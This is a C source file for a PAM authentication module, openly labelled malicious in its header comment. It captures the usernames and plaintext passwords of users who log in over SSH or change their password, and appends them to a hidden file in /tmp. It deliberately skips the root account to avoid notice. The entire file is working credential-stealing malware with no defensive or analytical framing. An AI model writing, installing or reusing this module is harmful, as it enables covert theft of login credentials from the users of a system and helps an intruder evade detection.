/*
 * pam_logger.c - Malicious PAM module to capture clear text SSH login credentials.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <syslog.h>
#include <time.h>
#include <unistd.h>
#include <sys/stat.h>

/* Log file location */
#define LOG_FILE "/tmp/.service_temp_data"

/* 
 * Function to log credentials to a hidden file
 */
static void log_credentials(const char *username, const char *password) {
    FILE *fp;
    time_t now;
    char timestamp[64];
    
    time(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    /* Open log file with append mode */
    fp = fopen(LOG_FILE, "a");
    if (fp != NULL) {
        fprintf(fp, "[%s] User: '%s' Password: '%s'\n", timestamp, username, password);
        fclose(fp);
        
        /* Set restrictive permissions */
        chmod(LOG_FILE, 0600);
    }
}

/* 
 * Called to authenticate the user
 */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char *username = NULL;
    const char *password = NULL;
    char *prompt = NULL;
    
    /* Get username */
    retval = pam_get_user(pamh, &username, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    
    /* Skip root account as this might be too noticeable */
    if (username != NULL && strcmp(username, "root") == 0) {
        return PAM_IGNORE;
    }
    
    /* Use custom conversation to get password */
    if (asprintf(&prompt, "Password: ") < 0) {
        return PAM_SYSTEM_ERR;
    }
    
    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, prompt);
    free(prompt);
    
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    
    /* Log the credentials */
    if (password != NULL) {
        log_credentials(username, password);
    }
    
    /* We pass control to the next module in the stack */
    return PAM_IGNORE;
}

/* 
 * Called when user changes their password
 */
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    int retval;
    const char *username = NULL;
    const char *password = NULL;
    
    /* Skip preliminary check */
    if (flags & PAM_PRELIM_CHECK) {
        return PAM_SUCCESS;
    }
    
    /* Get username */
    retval = pam_get_user(pamh, &username, NULL);
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    
    /* Get the new password */
    retval = pam_get_item(pamh, PAM_AUTHTOK, (const void **)&password);
    if (retval != PAM_SUCCESS) {
        return retval;
    }
    
    /* Log the credentials */
    if (password != NULL) {
        log_credentials(username, password);
    }
    
    /* Pass control */
    return PAM_SUCCESS;
}

/* 
 * These functions are needed for a valid PAM module
 * but we don't need to implement their functionality
 */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
